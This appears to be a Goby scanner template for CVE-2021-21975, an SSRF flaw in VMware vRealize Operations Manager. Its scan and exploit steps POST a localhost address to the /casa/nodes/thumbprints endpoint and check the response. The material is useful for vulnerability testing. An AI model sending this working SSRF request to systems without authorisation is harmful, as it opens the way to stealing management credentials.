{
      "Name": "VMWare Operations vRealize Operations Manager API SSRF CVE-2021-21975 vmware-vrealize",
      "Level": "2",
      "Tags": [
            "SSRF"
      ],
      "GobyQuery": "app=\"Apache-Web-Server\" && title==\"vRealize Operations Manager\"",
      "Description": "malicious attackers who access the vrealize Operations Manager API through the network can perform server-side request forgery attack to steal management credentials.",
      "Product": "VMWare Operations vRealize Operations",
      "Homepage": "https://www.vmware.com/cn/products/vrealize-operations.html",
      "Author": "PeiQi",
      "Impact": "<p>&nbsp;can perform server-side request forgery attack to steal management credentials.<br></p>",
      "Recommandation": "<p>undefined</p>",
      "References": [
            "http://wiki.peiqi.tech"
      ],
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/casa/nodes/thumbprints",
                        "follow_redirect": false,
                        "header": {
                              "Content-Type": "application/json;charset=UTF-8"
                        },
                        "data_type": "text",
                        "data": "[\"127.0.0.1:443\"]"
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "not contains",
                                    "value": "error_message",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "thumbprint",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "address",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
	  "ExploitSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/casa/nodes/thumbprints",
                        "follow_redirect": false,
                        "header": {
                              "Content-Type": "application/json;charset=UTF-8"
                        },
                        "data_type": "text",
                        "data": "[\"127.0.0.1:443\"]"
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "not contains",
                                    "value": "error_message",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "thumbprint",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "address",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": [
					"output|lastbody"
				  ]
            }
      ],
      "PostTime": "2021-04-07 23:45:28",
      "GobyVersion": "1.8.255"
}